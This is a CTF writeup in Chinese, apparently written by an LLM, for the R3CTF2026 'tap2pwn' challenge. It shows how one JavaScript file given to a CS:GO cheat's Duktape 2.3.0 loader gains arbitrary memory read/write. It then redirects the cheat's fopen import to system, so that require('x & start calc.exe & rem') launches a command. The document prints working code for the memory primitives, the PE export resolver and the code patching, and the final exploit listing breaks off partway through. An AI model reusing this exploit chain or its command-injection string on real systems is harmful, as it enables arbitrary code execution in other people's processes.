# R3CTF2026 tap2pwn Writeup by LLM

## 0. 目标和结论

题目给的是一份旧版 CS:GO 环境和一个 OTC3 风格的外挂模块。外挂内置 JavaScript loader，界面中 `Misc -> JavaScript -> Reload all` 会加载 `ot\scripts` 目录里的脚本。

最终目标：

- 提交单个 `.js` 文件。
- 点击 Reload 后弹出 Windows 计算器。
- RCE 完成后游戏继续正常运行。
- 不做暴力破解地址。

最终效果：

1. OTC 加载 `rce.js`。
2. 利用 Duktape 2.3.0 的对象/编译函数构造问题获得任意地址读写。
3. 通过 `Duktape.modSearch` 的 native 函数指针反推出 OTC inner module base。
4. 从 OTC IAT 读出 `ucrtbase!fopen`，定位 `ucrtbase.dll`，解析 `system`。
5. 临时 patch `require()` 的文件存在性检查分支。
6. 临时 patch OTC 的 `fopen` IAT 为 `system`。
7. 调用 `require("x & start calc.exe & rem")`，实际执行 `system()` 弹计算器。
8. 在 `finally` 中恢复 IAT 和分支字节，游戏继续运行。


![image](./imgs/rce.png)


## 1. 环境

工作目录：

```powershell
D:\HOME\Downloads\R3CTF
```

题目目录：

```text
D:\HOME\Downloads\R3CTF\tap2pwn
```

关键文件：

```text
D:\HOME\Downloads\R3CTF\tap2pwn\2020\csgo.exe
D:\HOME\Downloads\R3CTF\tap2pwn\lugi3g.dll
D:\HOME\Downloads\R3CTF\tap2pwn\lugi3g_inner.dll
D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts\active.js
D:\HOME\Downloads\R3CTF\tap2pwn\submission\rce.js
```

工具：

```text
Frida Python / frida CLI
C:\Program Files\WindowsApps\Microsoft.WinDbg_1.2603.20001.0_x64__8wekyb3d8bbwe\
D:\win_disasm_tools\LLVM\bin
D:\win_disasm_tools\radare2-6.1.8-w64\bin
D:\MVS\2022\Community\VC\Tools
```

radare2 使用时注意这个目录里可用的是：

```text
D:\win_disasm_tools\radare2-6.1.8-w64\bin\radare2.exe
D:\win_disasm_tools\radare2-6.1.8-w64\bin\rabin2.exe
```

## 2. 入口确认

截图里的界面是 OTC3 风格菜单：

```text
Misc -> JavaScript
```

`Reload all` 会重新解析 `D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts` 目录下的 JS。

最小探测脚本：

```javascript
Cheat.Print("[00] loaded\n");
Cheat.Print("[00] Cheat.Print ok\n");
```

把它放到：

```text
D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts\active.js
```

然后在游戏内点：

```text
Misc -> JavaScript -> Reload all
```

控制台出现：

```text
[00] loaded
[00] Cheat.Print ok
```

说明 JS loader 路径已经确认。

## 3. JavaScript 引擎确认

探测全局 `Duktape`：

```javascript
function log(s) {
    Cheat.Print("[01] " + s + "\n");
}

log("typeof Duktape=" + typeof Duktape);
log("version=" + Duktape.version);
log("typeof enc=" + typeof Duktape.enc);
log("typeof dec=" + typeof Duktape.dec);
log("typeof info=" + typeof Duktape.info);
```

运行结果：

```text
[01a] typeof Duktape=object
[01a] version=20300
[01a] typeof enc=function
[01a] typeof dec=function
[01a] typeof info=function
```

`20300` 对应 Duktape 2.3.0。

枚举 `Duktape` 属性：

```javascript
var ks = Object.getOwnPropertyNames(Duktape);
Cheat.Print("[01b] count=" + ks.length + "\n");
for (var i = 0; i < ks.length; i++) {
    Cheat.Print("[01b] key[" + i + "]=" + ks[i] + " type=" + typeof Duktape[ks[i]] + "\n");
}
```

结果：

```text
[01b] count=13
[01b] key[0]=version type=number
[01b] key[1]=Pointer type=function
[01b] key[2]=Thread type=function
[01b] key[3]=info type=function
[01b] key[4]=act type=function
[01b] key[5]=gc type=function
[01b] key[6]=fin type=function
[01b] key[7]=enc type=function
[01b] key[8]=dec type=function
[01b] key[9]=compact type=function
[01b] key[10]=env type=string
[01b] key[11]=modLoaded type=object
[01b] key[12]=modSearch type=function
```

这几个接口非常关键：

- `Duktape.info(obj)` 可以泄漏对象 header 指针。
- `Duktape.dec("jx", "(41414141)")` 可以构造 Duktape Pointer。
- `Uint8Array.allocPlain()` 可以分配 plain buffer，方便布置 fake object。
- `Duktape.modSearch` 是 native function，后面用它定位 OTC inner image。

## 4. Duktape 指针和对象布局探测

探测 `Duktape.info()`：

```javascript
function log(s) {
    Cheat.Print("[01e] " + s + "\n");
}

var info = Duktape.info(function f(){});
var ks = Object.getOwnPropertyNames(info);
log("prop_count=" + ks.length);
for (var i = 0; i < ks.length; i++) {
    var k = ks[i];
    log("prop[" + i + "] " + k + " -> " + typeof info[k] + ":" + info[k]);
}
```

典型输出：

```text
[01e] prop_count=13
[01e] prop[0] hptr -> pointer:44E17CD8
[01e] prop[1] type -> number:6
[01e] prop[2] itag -> number:65529
[01e] prop[3] refc -> number:3
[01e] prop[4] hbytes -> number:64
[01e] prop[5] class -> number:3
[01e] prop[6] pbytes -> number:68
[01e] prop[7] esize -> number:5
[01e] prop[8] enext -> number:5
[01e] prop[9] asize -> number:0
[01e] prop[10] hsize -> number:0
[01e] prop[11] bcbytes -> number:4
[01e] prop[12] variant -> number:0
```

探测 Pointer 编解码：

```javascript
function log(s) {
    Cheat.Print("[01h] " + s + "\n");
}

function show(name, x) {
    log(name + " type=" + typeof x + " str=" + String(x) +
        " jx=" + Duktape.enc("jx", x) +
        " jc=" + Duktape.enc("jc", x));
}

show("jx_41414141", Duktape.dec("jx", "(41414141)"));
show("jx_0x41414141", Duktape.dec("jx", "(0x41414141)"));
```

结果：

```text
[01h] jx_41414141 type=pointer str=41414141 jx=(41414141) jc={"_ptr":"41414141"}
[01h] jx_0x41414141 type=pointer str=41414141 jx=(41414141) jc={"_ptr":"41414141"}
```

所以可以用：

```javascript
function P(x) {
    return Duktape.dec("jx", "(" + x + ")");
}
```

构造任意 pointer tval。

探测 plain buffer：

```javascript
var b = Uint8Array.allocPlain(16);
for (var i = 0; i < 16; i++) {
    b[i] = 0x41 + i;
}
Cheat.Print("[01i] hptr=" + Duktape.info(b).hptr + "\n");
Cheat.Print("[01i] hex=" + Duktape.enc("hex", b) + "\n");
```

观察到 plain buffer 类型为 type 7，数据区域在 `hptr + 0x18` 附近。这一点后面用来把 fake Duktape 结构直接写在 JS 可控内存里。

## 5. 本地 Duktape harness

为了快速验证 Duktape 结构和 bytecode，不依赖每次重启游戏，编译了一个本地 x86 Duktape 2.3.0 harness。

编译命令：

```cmd
cmd.exe /c ""D:\MVS\2022\Community\VC\Auxiliary\Build\vcvarsall.bat" x86 >nul && cl /nologo /Od /Zi /D_CRT_SECURE_NO_WARNINGS /I D:\HOME\Downloads\R3CTF\duktape_src\duktape-2.3.0\src D:\HOME\Downloads\R3CTF\duktape_src\duktape-2.3.0\src\duktape.c D:\HOME\Downloads\R3CTF\duktape_src\duk_run.c /Fe:D:\HOME\Downloads\R3CTF\duktape_src\duk_run230_x86.exe"
```

本地 harness 增加了：

- `print()`
- `debugBreak()`
- `scriptArgs`
- `nativePtr(module, symbol)`

本地测试运行方式：

```powershell
D:\HOME\Downloads\R3CTF\duktape_src\duk_run230_x86.exe D:\HOME\Downloads\R3CTF\duktape_src\gh_ctrl\test.js
```

本地验证的几个关键结论：

- fake `duk_hcompfunc` 可以让 `eval()` 返回一个由我们控制的 fake function。
- fake bytecode `RETUNDEF = 0x0000009e` 可正常返回 `undefined`。
- fake bytecode `RETCONST 0 = 0x0000009f` 可返回 const 表里的任意 JS object。
- 伪造 `Uint8Array` + external `duk_hbuffer` 后，可以通过修改 fake hbuffer backing pointer 实现任意地址读写。

## 6. 任意地址读写原语

最终脚本使用 Duktape 2.3.0 的编译函数对象构造技巧。核心思路：

1. 分配 `arena = Uint8Array.allocPlain(0x500)`。
2. 在 `arena` 的 backing store 中布置：
   - fake `duk_hcompfunc`
   - fake function data fixed buffer
   - fake `duk_hbufobj`
   - fake external `duk_hbuffer`
3. 利用 `Array.prototype[0]` setter 在 Duktape 编译流程中把内部模板函数替换成 fake `duk_hcompfunc` 指针。
4. fake bytecode 返回 const0，也就是 fake `Uint8Array` 对象。
5. 之后 JS 里拿到的 `rw` 是一个由我们控制 backing pointer 的 `Uint8Array`。
6. 每次读写前改 fake hbuffer 的 `size` 和 `curr_alloc`，就能把 `rw[0]` 映射到任意地址。

关键 tval / tag：

```text
pointer tag: 0xfff6
string  tag: 0xfff8
object  tag: 0xfff9
buffer  tag: 0xfffa
```

关键结构偏移：

```text
duk_hobject size: 0x28

duk_hcompfunc:
  +0x28 data
  +0x2c funcs
  +0x30 bytecode
  +0x34 lex_env
  +0x38 var_env
  +0x3c nregs
  +0x3e nargs

duk_hbufobj:
  +0x28 buf
  +0x2c buf_prop
  +0x30 offset
  +0x34 length
  +0x38 shift
  +0x39 elem_type
  +0x3a is_typedarray

external duk_hbuffer:
  +0x10 size
  +0x14 curr_alloc / external data pointer
```

最终读写函数：

```javascript
function setAddr(addr, len) {
    addr = addr >>> 0;
    if (len === undefined) {
        len = 0x1000;
    }
    len = len >>> 0;
    w32buf(fakeBufOff + 0x10, len);
    w32buf(fakeBufOff + 0x14, addr);
}

function read8(addr) {
    setAddr(addr, 1);
    return rw[0] & 0xff;
}

function write8(addr, val) {
    setAddr(addr, 1);
    rw[0] = val & 0xff;
}

function read16(addr) {
    setAddr(addr, 2);
    return ((rw[0] & 0xff) | ((rw[1] & 0xff) << 8)) >>> 0;
}

function read32(addr) {
    setAddr(addr, 4);
    return ((rw[0] & 0xff) |
            ((rw[1] & 0xff) << 8) |
            ((rw[2] & 0xff) << 16) |
            ((rw[3] & 0xff) << 24)) >>> 0;
}

function write32(addr, val) {
    setAddr(addr, 4);
    rw[0] = val & 0xff;
    rw[1] = (val >>> 8) & 0xff;
    rw[2] = (val >>> 16) & 0xff;
    rw[3] = (val >>> 24) & 0xff;
}
```

## 7. OTC inner DLL 分析

`lugi3g.dll` 外层 DLL 里嵌了一个 inner PE。提取后为：

```text
D:\HOME\Downloads\R3CTF\tap2pwn\lugi3g_inner.dll
```

静态信息：

```text
ImageBase:   0x10000000
SizeOfImage: 0x010bb000
.IAT RVA:    0x10a5000
import RVA:  0x10a6000
```

关键 IAT RVA：

```text
GetProcAddress: 0x10a5018
LoadLibraryA:   0x10a5074
fread:          0x10a50f8
fopen:          0x10a5130
fseek:          0x10a51bc
ftell:          0x10a51c0
rewind:         0x10a51c4
CreateFileW:    0x10a5048
```

关键字符串：

```text
[onetap] file does not exist\n : 0x108513ec
"rb"                           : 0x108513e8
"(function(require,exports,module){" : 0x10850100
```

反汇编命令：

```powershell
D:\win_disasm_tools\radare2-6.1.8-w64\bin\radare2.exe -q -A -c "s 0x10106020; pd 60" D:\HOME\Downloads\R3CTF\tap2pwn\lugi3g_inner.dll
```

`require()` 模块加载路径中的关键逻辑：

```asm
0x10106043  call fcn.1002d5e0
0x10106055  cmp byte [esp + 0xf], 0
0x1010605a  jne 0x10106076
0x1010605c  push "[onetap] file does not exist\n"
...
0x10106076  ...
0x1010607f  push "rb"
0x10106089  push eax
0x1010608a  call dword [fopen]
```

这里 `0x1010605a` 的字节是：

```text
75 1a
```

含义是文件存在才跳过错误分支。最终单文件利用会临时改成：

```text
eb 1a
```

也就是无条件跳到 `fopen` 调用处。

另一个脚本加载路径也会调用 `fopen`：

```powershell
D:\win_disasm_tools\radare2-6.1.8-w64\bin\radare2.exe -q -A -c "s 0x10103cf0; pd 70" D:\HOME\Downloads\R3CTF\tap2pwn\lugi3g_inner.dll
```

关键片段：

```asm
0x10103d26  push "rb"
0x10103d2b  push edi
0x10103d2c  call dword [fopen]
```

但这个路径是当前脚本自身加载时使用，payload 运行时已经错过，所以最终选择 `require()` 作为触发点。

## 8. inner module base 的定位

一开始尝试从 native 函数地址向下扫描 PE 头：

```javascript
function isPeBase(base) {
    var e_lfanew;
    if (read16(base) !== 0x5a4d) {
        return false;
    }
    e_lfanew = read32((base + 0x3c) >>> 0);
    if (e_lfanew > 0x1000) {
        return false;
    }
    return read32((base + e_lfanew) >>> 0) === 0x00004550;
}

function findModuleBase(ptr) {
    var base = ptr & 0xffff0000;
    var i;
    for (i = 0; i < 0x400; i++) {
        if (isPeBase(base >>> 0)) {
            return base >>> 0;
        }
        base = (base - 0x10000) >>> 0;
    }
    return 0;
}
```

这个方法对系统 DLL 有效，但对 OTC inner image 不稳定，因为 inner PE 是手动映射的，扫描到的可能是外层或 Frida agent 相关模块。

后来使用 `Duktape.modSearch` 的 native 函数指针。静态分析中 `modSearch` callback 在 inner image 的 RVA 为：

```text
0x105a80
```

运行时泄漏：

```javascript
fn = Duktape.modSearch;
obj = hptrOf(fn);
cfunc = read32((obj + 0x28) >>> 0);
base = (cfunc - 0x105a80) >>> 0;
```

实际日志：

```text
[rce] modSearch obj=4595a110 cfunc=84275a80 innerBaseByRva=84170000
[rce] inner check base=84170000 k32=kernel32.dll ucrt=ucrtbase.dll fopen=74c29580 fopenBase=74bf0000
[rce] selected otcBase=84170000
```

`0x84275a80 - 0x105a80 = 0x84170000`，因此真实 inner base 为 `0x84170000`。

为了避免误判，还用 import table 中的 DLL 名和 `fopen` 指针校验：

```javascript
function validateInnerBase(base) {
    var k32;
    var ucrt;
    var fopenPtr;
    var ucrtBase;

    k32 = readAsciiAt((base + 0x10a60c8) >>> 0, 32);
    ucrt = readAsciiAt((base + 0x10a6497) >>> 0, 32);
    fopenPtr = read32((base + 0x10a5130) >>> 0);
    ucrtBase = findModuleBase(fopenPtr);
    log("inner check base=" + hex32(base) +
        " k32=" + k32 +
        " ucrt=" + ucrt +
        " fopen=" + hex32(fopenPtr) +
        " fopenBase=" + hex32(ucrtBase));
    return k32 === "kernel32.dll" && ucrt === "ucrtbase.dll" && ucrtBase !== 0;
}
```

## 9. 解析 `ucrtbase!system`

拿到 inner base 后，读取 `fopen` IAT：

```javascript
fopenIat = (otcBase + 0x10a5130) >>> 0;
oldFopen = read32(fopenIat);
ucrtBase = findModuleBase(oldFopen);
```

日志：

```text
[rce] fopenIAT=85215130 fopen=74c29580 ucrtBase=74bf0000
```

然后自己解析 PE export，查找 `system`：

```javascript
function resolveExport(moduleBase, wanted) {
    var pe;
    var opt;
    var expRva;
    var expSize;
    var exp;
    var numNames;
    var funcs;
    var names;
    var ords;
    var i;
    var nameRva;
    var name;
    var ord;
    var funcRva;

    pe = (moduleBase + read32((moduleBase + 0x3c) >>> 0)) >>> 0;
    opt = (pe + 0x18) >>> 0;
    expRva = read32((opt + 0x60) >>> 0);
    expSize = read32((opt + 0x64) >>> 0);
    if (expRva === 0) {
        return 0;
    }

    exp = (moduleBase + expRva) >>> 0;
    numNames = read32((exp + 0x18) >>> 0);
    funcs = (moduleBase + read32((exp + 0x1c) >>> 0)) >>> 0;
    names = (moduleBase + read32((exp + 0x20) >>> 0)) >>> 0;
    ords = (moduleBase + read32((exp + 0x24) >>> 0)) >>> 0;

    for (i = 0; i < numNames; i++) {
        nameRva = read32((names + i * 4) >>> 0);
        name = readAsciiAt((moduleBase + nameRva) >>> 0, 96);
        if (name === wanted) {
            ord = read16((ords + i * 2) >>> 0);
            funcRva = read32((funcs + ord * 4) >>> 0);
            if (funcRva >= expRva && funcRva < ((expRva + expSize) >>> 0)) {
                log("forwarded export " + wanted + "=" + readAsciiAt((moduleBase + funcRva) >>> 0, 128));
                return 0;
            }
            return (moduleBase + funcRva) >>> 0;
        }
    }
    return 0;
}
```

运行结果：

```text
[rce] system=74cd28d0
```

## 10. 第一版触发：额外文件绕过存在性检查

第一版利用只 patch `fopen` IAT：

```javascript
write32(fopenIat, systemPtr);
require("x & start calc.exe & rem ");
write32(fopenIat, oldFopen);
```

结果：

```text
[rce] fopen IAT patched
[onetap] parsing module D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts\x & start calc.exe & rem :
[onetap] file does not exist
[rce] fopen IAT restored
[rce] done
```

原因是 `require()` 在调用 `fopen` 前先做了文件存在性检查。文件不存在时直接返回，根本不会走到 patched `fopen`。

临时绕过方法是创建一个同名空文件：

```powershell
New-Item -ItemType File -Path 'D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts\x & start calc.exe & rem' -Force
```

同时把命令名改成不带末尾空格：

```javascript
cmdName = "x & start calc.exe & rem";
```

这样文件检查通过，`fopen` 被调用；由于 IAT 已经被改成 `system`，实际执行：

```cmd
D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts\x & start calc.exe & rem
```

`cmd.exe` 会把 `&` 当作命令分隔符，中间的 `start calc.exe` 弹出计算器。

但是题目要求提交单个 `.js` 文件，因此不能依赖这个额外空文件。

## 11. 最终单文件触发

最终单文件方案是在 JS 里临时 patch `require()` 的文件存在性检查分支。

静态地址：

```text
inner image RVA: 0x10605a
原字节: 75 1a
新字节: eb 1a
```

运行时地址：

```javascript
requireCheckJcc = (otcBase + 0x10605a) >>> 0;
oldCheckJcc = read8(requireCheckJcc);
```

patch 前做校验：

```javascript
if (read8((requireCheckJcc + 1) >>> 0) !== 0x1a ||
        (oldCheckJcc !== 0x75 && oldCheckJcc !== 0xeb)) {
    throw new Error("unexpected require file check bytes");
}
```

然后：

```javascript
write8(requireCheckJcc, 0xeb);
```

触发：

```javascript
write32(fopenIat, systemPtr);
require("x & start calc.exe & rem");
```

恢复：

```javascript
write32(fopenIat, oldFopen);
write8(requireCheckJcc, oldCheckJcc);
```

为了保证游戏继续正常运行，最终脚本把恢复逻辑放在 `finally` 中，并用 flag 记录是否已经 patch 成功：

```javascript
var patchedFopen = false;
var patchedCheck = false;

try {
    write8(requireCheckJcc, 0xeb);
    patchedCheck = true;

    write32(fopenIat, systemPtr);
    patchedFopen = true;

    require(cmdName);
} catch (e) {
    log("require returned error=" + e);
} finally {
    if (patchedFopen) {
        write32(fopenIat, oldFopen);
        log("fopen IAT restored");
    }
    if (patchedCheck) {
        write8(requireCheckJcc, oldCheckJcc);
        log("require file check restored");
    }
}
```

这样计算器弹出后，OTC 的 IAT 和代码分支都恢复，游戏不会因为持久 patch 而坏掉。

## 12. 最终演示步骤

准备最终单文件：

```powershell
Copy-Item -Path 'D:\HOME\Downloads\R3CTF\tap2pwn\submission\rce.js' -Destination 'D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts\active.js' -Force
```

确保 `scripts` 目录演示时只保留一个 JS，避免 `Reload all` 加载其它测试脚本：

```powershell
Get-ChildItem -Force -Path 'D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts'
```

如果有旧的测试文件，可以移走：

```powershell
New-Item -ItemType Directory -Path 'D:\HOME\Downloads\R3CTF\tap2pwn\backup_scripts' -Force
Move-Item -Path 'D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts\exp.js' -Destination 'D:\HOME\Downloads\R3CTF\tap2pwn\backup_scripts\exp.js' -Force
```

启动游戏并注入外挂后，打开 OTC 菜单：

```text
Misc -> JavaScript -> Reload all
```

预期控制台日志：

```text
[rce] start
[rce] arena=...
[rce] arw ready tag=[object Uint8Array] hits=3
[rce] modSearch obj=... cfunc=... innerBaseByRva=...
[rce] inner check base=... k32=kernel32.dll ucrt=ucrtbase.dll fopen=... fopenBase=...
[rce] selected otcBase=...
[rce] fopenIAT=... fopen=... ucrtBase=...
[rce] system=...
[rce] require file check jcc=... old=75
[rce] require file check patched
[rce] fopen IAT patched
[rce] fopen IAT restored
[rce] require file check restored
[rce] done
```

同时 Windows 计算器弹出，游戏窗口保持运行。

## 13. 注入方式和踩坑

### 13.1 Frida 注入不稳定

曾经尝试：

```powershell
frida -n csgo.exe -e "Module.load('D:\\HOME\\Downloads\\R3CTF\\tap2pwn\\lugi3g.dll')"
```

或：

```powershell
frida -p 29024 -e "console.log(Process.arch)"
```

有时会失败：

```text
Failed to attach: process with pid 29024 either refused to load frida-agent, or terminated during injection
```

这不是漏洞利用本身依赖 Frida，而是 Frida agent 会改变进程模块布局，而且注入时机不稳定。旧版 payload 曾经通过“从函数地址向下扫描 PE 头”找 OTC base，结果可能扫到 Frida 相关模块，导致写错 IAT 地址并崩溃。

修复后，payload 通过：

```text
Duktape.modSearch cfunc - 0x105a80
```

直接得到 inner image base，并通过 import 字符串和 `fopen` 指针二次校验，所以注入工具不再是关键因素。System Informer 注入只要能正常加载 `lugi3g.dll`，同一份 JS 也应该可用。

### 13.2 `system=0` 的原因

错误日志中曾经出现：

```text
[rce] frida_web_connection_construct
[rce] frida_web_connection_get_type
...
[rce] system=00000000
[rce] fatal=Error: failed to resolve system
```

这是因为当时 `otcBase` 错了，`fopenIAT` 读出来不是 OTC 的 IAT，而是落到其它模块附近，后续 `findModuleBase()` 找到了 Frida agent DLL。枚举 export 时看到一堆 `frida_*`，当然解析不到 `system`。

### 13.3 为什么命令字符串是 `x & start calc.exe & rem`

`system()` 接收的是一个命令行字符串。我们通过 `require(cmdName)` 控制传给 `fopen(filename, "rb")` 的第一个参数。

当 IAT 被改成 `system` 后，调用等价于：

```c
system("x & start calc.exe & rem");
```

含义：

- `x`：无所谓是否存在。
- `&`：cmd 命令分隔符。
- `start calc.exe`：启动计算器。
- `rem`：注释掉后面可能附带的内容，使命令尾部更稳定。

### 13.4 为什么不能只 patch `fopen`

因为 `require()` 的模块加载路径中，`fopen` 前有文件存在性检查：

```asm
cmp byte [esp + 0xf], 0
jne open_file
print "[onetap] file does not exist"
return
```

不存在文件时不会调用 `fopen`，所以单纯 patch IAT 不触发。最终单文件版本通过临时 patch `jne` 为 `jmp` 解决这个问题。

## 14. 最终利用链伪代码

```javascript
buildArw();

otcBase = Duktape.modSearch.cfunc - 0x105a80;
validateInnerBase(otcBase);

fopenIat = otcBase + 0x10a5130;
oldFopen = read32(fopenIat);
ucrtBase = findModuleBase(oldFopen);
systemPtr = resolveExport(ucrtBase, "system");

requireCheckJcc = otcBase + 0x10605a;
oldCheckJcc = read8(requireCheckJcc);

try {
    write8(requireCheckJcc, 0xeb);
    write32(fopenIat, systemPtr);
    require("x & start calc.exe & rem");
} finally {
    write32(fopenIat, oldFopen);
    write8(requireCheckJcc, oldCheckJcc);
}
```

## 15. 关键命令清单

查看脚本目录：

```powershell
Get-ChildItem -Force -Path 'D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts' |
    ForEach-Object { '[' + $_.Name + '] len=' + $_.Length }
```

部署最终脚本：

```powershell
Copy-Item -Path 'D:\HOME\Downloads\R3CTF\tap2pwn\submission\rce.js' `
    -Destination 'D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts\active.js' -Force
```

计算 hash：

```powershell
(Get-FileHash -Algorithm SHA256 -Path 'D:\HOME\Downloads\R3CTF\tap2pwn\submission\rce.js').Hash
```

反汇编 `require()` 文件检查：

```powershell
D:\win_disasm_tools\radare2-6.1.8-w64\bin\radare2.exe -q -A -c "s 0x10106020; pd 60" D:\HOME\Downloads\R3CTF\tap2pwn\lugi3g_inner.dll
```

反汇编脚本加载 `fopen` 路径：

```powershell
D:\win_disasm_tools\radare2-6.1.8-w64\bin\radare2.exe -q -A -c "s 0x10103cf0; pd 70" D:\HOME\Downloads\R3CTF\tap2pwn\lugi3g_inner.dll
```

编译本地 Duktape harness：

```cmd
cmd.exe /c ""D:\MVS\2022\Community\VC\Auxiliary\Build\vcvarsall.bat" x86 >nul && cl /nologo /Od /Zi /D_CRT_SECURE_NO_WARNINGS /I D:\HOME\Downloads\R3CTF\duktape_src\duktape-2.3.0\src D:\HOME\Downloads\R3CTF\duktape_src\duktape-2.3.0\src\duktape.c D:\HOME\Downloads\R3CTF\duktape_src\duk_run.c /Fe:D:\HOME\Downloads\R3CTF\duktape_src\duk_run230_x86.exe"
```

运行本地 Duktape 测试：

```powershell
D:\HOME\Downloads\R3CTF\duktape_src\duk_run230_x86.exe D:\HOME\Downloads\R3CTF\duktape_src\gh_ctrl\test.js
```

Frida 注入尝试命令：

```powershell
frida -n csgo.exe -e "Module.load('D:\\HOME\\Downloads\\R3CTF\\tap2pwn\\lugi3g.dll')"
```

## 16. 最终状态检查

最终演示前确认：

```powershell
Get-ChildItem -Force -Path 'D:\HOME\Downloads\R3CTF\tap2pwn\2020\ot\scripts'
```

最好只看到：

```text
active.js
```

最终提交只交：

```text
D:\HOME\Downloads\R3CTF\tap2pwn\submission\rce.js
```

不需要额外文件，不需要固定 ASLR 地址，不需要爆破。


## exploit

```js
function log(s) {
    Cheat.Print("[rce] " + s + "\n");
}

var DO_RCE = true;
var PATCH_REQUIRE_FILE_CHECK = true;
var arena = Uint8Array.allocPlain(0x500);
var fakeCompPtr;
var fakeBufOff = 0x280;
var rw;
var hits = 0;
var globalObj = (function () { return this; })();

function hex32(n) {
    if (n < 0) {
        n += 0x100000000;
    }
    n = n >>> 0;
    var s = n.toString(16);
    while (s.length < 8) {
        s = "0" + s;
    }
    return s;
}

function P(x) {
    return Duktape.dec("jx", "(" + x + ")");
}

function hptrOf(x) {
    return parseInt(String(Duktape.info(x).hptr), 16) >>> 0;
}

function w8buf(o, v) {
    arena[o] = v & 0xff;
}

function w16buf(o, v) {
    w8buf(o + 0, v);
    w8buf(o + 1, v >>> 8);
}

function w32buf(o, v) {
    w8buf(o + 0, v);
    w8buf(o + 1, v >>> 8);
    w8buf(o + 2, v >>> 16);
    w8buf(o + 3, v >>> 24);
}

function setAddr(addr, len) {
    addr = addr >>> 0;
    if (len === undefined) {
        len = 0x1000;
    }
    len = len >>> 0;
    w32buf(fakeBufOff + 0x10, len);
    w32buf(fakeBufOff + 0x14, addr);
}

function read8(addr) {
    setAddr(addr, 1);
    return rw[0] & 0xff;
}

function write8(addr, val) {
    setAddr(addr, 1);
    rw[0] = val & 0xff;
}

function read16(addr) {
    setAddr(addr, 2);
    return ((rw[0] & 0xff) | ((rw[1] & 0xff) << 8)) >>> 0;
}

function read32(addr) {
    setAddr(addr, 4);
    return ((rw[0] & 0xff) |
            ((rw[1] & 0xff) << 8) |
            ((rw[2] & 0xff) << 16) |
            ((rw[3] & 0xff) << 24)) >>> 0;
}

function write32(addr, val) {
    setAddr(addr, 4);
    rw[0] = val & 0xff;
    rw[1] = (val >>> 8) & 0xff;
    rw[2] = (val >>> 16) & 0xff;
    rw[3] = (val >>> 24) & 0xff;
}

function readAsciiAt(addr, maxLen) {
    var out = "";
    var i;
    var c;
    setAddr(addr, maxLen);
    for (i = 0; i < maxLen; i++) {
        c = rw[i] & 0xff;
        if (c === 0) {
            break;
        }
        out += String.fromCharCode(c);
    }
    return out;
}

function isPeBase(base) {
    var e_lfanew;
    if (read16(base) !== 0x5a4d) {
        return false;
    }
    e_lfanew = read32((base + 0x3c) >>> 0);
    if (e_lfanew > 0x1000) {
        return false;
    }
    return read32((base + e_lfanew) >>> 0) === 0x00004550;
}

function findModuleBase(ptr) {
    var base = ptr & 0xffff0000;
    var i;
    for (i = 0; i < 0x400; i++) {
        if (isPeBase(base >>> 0)) {
            return base >>> 0;
        }
        base = (base - 0x10000) >>> 0;
    }
    return 0;
}

function peImageSize(base) {
    var pe;
    if (base === 0 || !isPeBase(base)) {
        return 0;
    }
    pe = (base + read32((base + 0x3c) >>> 0)) >>> 0;
    return read32((pe + 0x50) >>> 0);
}

function validateOtcBase(base) {
    var size;
    var k32;
    var ucrt;

    size = peImageSize(base);
    if (size !== 0x010bb000) {
        return false;
    }

    k32 = readAsciiAt((base + 0x10a60c8) >>> 0, 32);
    ucrt = readAsciiAt((base + 0x10a6497) >>> 0, 32);
    return k32 === "kernel32.dll" && ucrt === "ucrtbase.dll";
}

function validateInnerBase(base) {
    var k32;
    var ucrt;
    var fopenPtr;
    var ucrtBase;

    k32 = readAsciiAt((base + 0x10a60c8) >>> 0, 32);
    ucrt = readAsciiAt((base + 0x10a6497) >>> 0, 32);
    fopenPtr = read32((base + 0x10a5130) >>> 0);
    ucrtBase = findModuleBase(fopenPtr);
    log("inner check base=" + hex32(base) +
        " k32=" + k32 +
        " ucrt=" + ucrt +
        " fopen=" + hex32(fopenPtr) +
        " fopenBase=" + hex32(ucrtBase));
    return k32 === "kernel32.dll" && ucrt === "ucrtbase.dll" && ucrtBase !== 0;
}

function findOtcInnerBaseByModSearch() {
    var fn;
    var obj;
    var cfunc;
    var base;

    fn = Duktape.modSearch;
    if (typeof fn !== "function") {
        log("modSearch is not function");
        return 0;
    }

    obj = hptrOf(fn);
    cfunc = read32((obj + 0x28) >>> 0);
    base = (cfunc - 0x105a80) >>> 0;
    log("modSearch obj=" + hex32(obj) +
        " cfunc=" + hex32(cfunc) +
        " innerBaseByRva=" + hex32(base));

    if (validateInnerBase(base)) {
        return base;
    }
    return 0;
}

function getPath(path) {
    var parts = path.split(".");
    var cur = globalObj;
    var i;
    for (i = 0; i < parts.length; i++) {
        if (cur === undefined || cur === null) {
            return undefined;
        }
        cur = cur[parts[i]];
    }
    return cur;
}

function tryFunctionCandidate(name) {
    var fn;
    var obj;
    var flags;
    var cfunc;
    var base;
    var size;
    var ok;

    try {
        fn = getPath(name);
        if (typeof fn !== "function") {
            log("cand " + name + " missing/nonfunc");
            return 0;
        }
        obj = hptrOf(fn);
        flags = read32(obj);
        if ((flags & 0x00001000) === 0) {
            log("cand " + name + " obj=" + hex32(obj) + " flags=" + hex32(flags) + " not hnatfunc");
            return 0;
        }
        cfunc = read32((obj + 0x28) >>> 0);
        base = findModuleBase(cfunc);
        size = peImageSize(base);
        ok = validateOtcBase(base);
        log("cand " + name +
            " obj=" + hex32(obj) +
            " cfunc=" + hex32(cfunc) +
            " base=" + hex32(base) +
            " size=" + hex32(size) +
            " otc=" + ok);
        return ok ? base : 0;
    } catch (e) {
        log("cand " + name + " error=" + e);
        return 0;
    }
}

function findOtcBase() {
    var names = [
        "Duktape.info",
        "Duktape.enc",
        "Duktape.dec",
        "Duktape.gc",
        "Duktape.compact",
        "Duktape.modSearch",
        "Cheat.Print",
        "Cheat.ExecuteCommand",
        "Global.ExecuteCommand",
        "Render.AddTexture",
        "Render.String",
